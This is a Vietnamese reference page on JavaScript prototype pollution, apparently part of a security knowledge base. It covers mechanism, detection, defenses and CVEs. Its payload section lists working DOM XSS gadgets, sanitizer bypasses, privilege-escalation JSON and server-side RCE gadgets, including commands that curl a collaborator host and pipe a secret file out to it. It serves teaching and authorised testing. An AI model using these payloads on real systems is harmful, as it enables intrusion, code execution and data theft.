# Prototype Pollution

> Làm ô nhiễm Object.prototype trong JS làm thay đổi hành vi ứng dụng, dẫn tới XSS/RCE/DoS. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/prototype_pollution.md`](../../../../Troubleshooting_Guide/prototype_pollution.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A03:2021 Injection
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Prototype pollution là một lỗ hổng JavaScript trong đó kẻ tấn công chèn thuộc tính vào
`Object.prototype`, đối tượng mà mọi đối tượng khác đều kế thừa. Vì thay đổi này mang tính toàn cục,
nó âm thầm làm thay đổi cách hoạt động của những đoạn mã không liên quan — và tự thân trở nên nguy
hiểm khi một "gadget" về sau đọc phải thuộc tính đã bị ô nhiễm.

## Cơ chế hoạt động (How it works)
Các đối tượng JavaScript kế thừa từ một chuỗi prototype có thể truy cập qua các khóa đặc biệt `__proto__`
và `constructor.prototype`. Khi ứng dụng đệ quy merge, clone, hoặc gán các thuộc tính lồng nhau từ
dữ liệu do kẻ tấn công kiểm soát (query string, JSON body, URL fragment) mà không lọc các khóa này, một
payload như `__proto__[isAdmin]=true` sẽ ghi vào `Object.prototype`. Mọi đối tượng sau đó đều có vẻ như
có `isAdmin`. Sự ô nhiễm này nằm im cho đến khi một **gadget** — đoạn mã đọc một thuộc tính mà ứng dụng
mong đợi là undefined (một URL chuyển tải HTML/script, một cờ cấu hình, một tùy chọn `child_process`)
— bắt được nó và biến nó thành XSS, leo thang đặc quyền, hoặc RCE. Các tiện ích merge dễ bị tấn công như
`lodash.merge` cũ là nguồn kinh điển.

## Tác động (Impact)
Phía client: DOM XSS qua các gadget điều khiển script và giả mạo CSP-nonce. Phía server (Node.js):
vượt qua phân quyền / leo thang đặc quyền (`isAdmin`), từ chối dịch vụ do làm hỏng trạng thái dùng chung,
và thực thi mã từ xa thông qua các gadget trong tùy chọn spawn của `child_process`
(`execArgv`, `shell`, `NODE_OPTIONS`). Mức độ nghiêm trọng dao động từ trung bình tới nghiêm trọng (RCE).

## Cách phát hiện (How to detect)
- Client: gửi `/?__proto__[canary]=ppstudy1`, rồi đọc `Object.prototype.canary` trong console;
  một giá trị không phải undefined xác nhận sự ô nhiễm.
- Server: dùng các oracle không phá hủy — `{"__proto__":{"json spaces":10}}` khiến Express
  in JSON đẹp (pretty-print), và `{"__proto__":{"status":555}}` khiến một body lỗi phản chiếu status 555.
- Các hàm merge/clone lỏng lẻo và các thư viện có CVE ô nhiễm đã biết trong cây phụ thuộc.
- Các bộ lọc loại bỏ `__proto__`/`constructor` một lần (bị đánh bại bằng cách lồng nhau) hoặc chặn một
  khóa nhưng không chặn đường `constructor.prototype`.

## Khai thác (tóm tắt) (Exploitation)
Tìm một nguồn kiểm soát được dẫn tới một hàm gán thuộc tính đệ quy, xác nhận ô nhiễm bằng một
canary, rồi nối tới một gadget: gadget `transport_url`/`sequence` cho DOM XSS phía client, một
cờ `isAdmin` để leo thang đặc quyền, hoặc các tùy chọn `child_process` cho RCE phía server. Vượt qua
các bộ lọc ngây thơ bằng cách lồng các khóa bị cấm hoặc dùng đường `constructor.prototype`. Payload đầy đủ
nằm ở mục Payload phía trên.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Phát hiện phía client (Client-side detection)
Gây ô nhiễm qua query string, rồi đọc `Object.prototype.foo` trong console.
```text
/?__proto__[foo]=bar
/?__proto__.foo=bar
/?constructor.prototype.foo=bar
/?__proto__[canary]=ppstudy1        # distinctive canary value
```

### Các gadget DOM XSS phía client (Client-side DOM XSS gadgets)
Sự ô nhiễm chỉ hữu ích khi nó cấp dữ liệu cho một gadget điều khiển script.
```text
/?__proto__[transport_url]=data:,alert(1);     # script src / transport gadget
/?__proto__.sequence=alert(1)-                 # eval() gadget; trailing - absorbs an appended 1
/?__proto__[value]=data:,alert(1);             # when transport_url is locked via defineProperty
/?__proto__[hitCallback]=alert(document.cookie) # via URL fragment
```
Phát các gadget dựa trên fragment từ một exploit server:
```html
<script>location = "https://TARGET/#__proto__[hitCallback]=alert%28document.cookie%29";</script>
```
Các gadget khác: `__proto__[nonce]=…` (giả mạo một CSP nonce), `__proto__[toString]=polluted`
(phá vỡ logic ứng dụng qua việc ghi đè `toString`/`valueOf`).

### Vượt qua làm sạch phía client (Bypassing client-side sanitization)
Khi bộ lọc loại bỏ `__proto__` / `constructor` một lần, hãy lồng nó để việc loại bỏ tái tạo lại nó.
```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
/?constconstructorructor[protoprototypetype][foo]=bar
/?__pro__proto__to__[canary]=ppstudy1
```

### Phát hiện phía server (không phá hủy) (Server-side detection)
Các khóa cấu hình Express/Node là những oracle tốt.
```json
{ "__proto__": { "json spaces": 10 } }
```
Một phản hồi JSON đột nhiên thụt lề rất nhiều xác nhận sự ô nhiễm. Với JSON cố tình làm hỏng:
```json
{ "__proto__": { "status": 555 } }
```
một lỗi phản chiếu `status: 555` (thay vì 400/500) xác nhận điều đó. `content-type` với
`charset=utf-7` cũng phản chiếu tương tự vào header phản hồi.

### Vượt qua bộ lọc `__proto__` phía server (Server-side `__proto__`-filter bypass)
```json
{ "constructor": { "prototype": { "json spaces": 10 } } }
{ "__proto__": { "constructor": { "prototype": { "isAdmin": true } } } }
```

### Leo thang đặc quyền (Privilege escalation)
```json
{ "__proto__": { "isAdmin": true } }
```

### Các gadget RCE phía server (`child_process`) (Server-side RCE gadgets)
```json
{ "__proto__": { "execArgv": ["--eval=require('child_process').execSync('curl https://COLLABORATOR.oastify.com')"] } }
```
```json
{ "__proto__": { "shell": "vim", "input": ":! curl https://COLLABORATOR.oastify.com\n" } }
```
```json
{ "__proto__": { "env": { "NODE_OPTIONS": "--require=/proc/self/fd/0", "NODE_EXTRA_CA_CERTS": "/dev/stdin" } } }
```
Trích xuất dữ liệu bằng cách đẩy vào cùng gadget shell:
```json
{ "__proto__": { "shell": "vim", "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://COLLABORATOR.oastify.com\n" } }
```

### Các sink khác / nguồn đã biết (Other sinks / known sources)
```http
POST /api/search
Content-Type: application/x-www-form-urlencoded

__proto__[isAdmin]=true&query=test
```
```text
https://target.com/#{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}   # SPA hash-JSON
```
`lodash.merge` dễ bị tấn công (CVE-2019-10744) chấp nhận `{"constructor":{"prototype":{"isAdmin":true}}}`.

### Hướng dẫn lựa chọn (Selection guide)
| Mục tiêu | Payload |
|------|---------|
| Phát hiện phía client | `/?__proto__[foo]=bar` |
| DOM XSS phía client | `/?__proto__[transport_url]=data:,alert(1);` |
| Vượt qua làm sạch phía client | `/?__pro__proto__to__[foo]=bar` |
| Phát hiện phía server | `{ "__proto__": { "json spaces": 10 } }` |
| Leo thang đặc quyền | `{ "__proto__": { "isAdmin": true } }` |
| RCE (child_process) | `{ "__proto__": { "execArgv": ["--eval=…"] } }` |
| RCE qua gadget shell | `{ "__proto__": { "shell": "vim", "input": ":! cmd\n" } }` |
| Vượt qua chặn `__proto__` | `{ "constructor": { "prototype": { … } } }` |

## Phòng chống (Defenses)
1. **Chặn các khóa nguy hiểm** — từ chối hoặc loại bỏ `__proto__`, `constructor`, và `prototype` khỏi
   các khóa trong bất kỳ dữ liệu nào dẫn tới một thao tác merge/clone/path-set, theo cách đệ quy (không phải một lần).
2. **Dùng cấu trúc dữ liệu an toàn trước ô nhiễm** — `Object.create(null)` cho các map, kiểu `Map` cho
   dữ liệu khóa/giá trị, và các tiện ích merge đã được kiểm toán (lodash hiện tại, hoặc `Object.assign` trên các đối tượng phẳng).
3. **Đóng băng prototype** — `Object.freeze(Object.prototype)` để khiến ô nhiễm ném lỗi/thất bại.
4. **Kiểm tra dữ liệu theo một schema** để chỉ những thuộc tính được mong đợi mới được chấp nhận (danh sách cho phép, không phải danh sách chặn).
5. Giữ các phụ thuộc được vá (các thư viện merge dễ bị tấn công đã biết là nguồn phổ biến) và, trong
   Node 12+, cân nhắc `--disable-proto=delete` để loại bỏ accessor `__proto__`.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Prototype+Pollution
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Prototype+Pollution
- **Exploit-DB** — https://www.exploit-db.com/search?q=Prototype+Pollution
- **GitHub Advisories** — https://github.com/advisories?query=Prototype+Pollution
- **OSV** — https://osv.dev/list?q=Prototype+Pollution
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Prototype Pollution <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2019-10744` — lodash `defaultsDeep`/`merge` prototype pollution; một trong những advisory được
  phụ thuộc rộng rãi nhất trong hệ sinh thái npm.
- `CVE-2019-11358` — jQuery `$.extend(true, …)` prototype pollution (thường được nối với XSS).
- `CVE-2018-3721` / `CVE-2018-16487` — prototype pollution `merge`/`mergeWith` của lodash đời trước.

## Tham khảo (References)
- PortSwigger Web Security Academy — Prototype pollution.
- OWASP — Prototype Pollution Prevention Cheat Sheet.
- Tài liệu Node.js — cờ `--disable-proto` và hướng dẫn về prototype pollution.
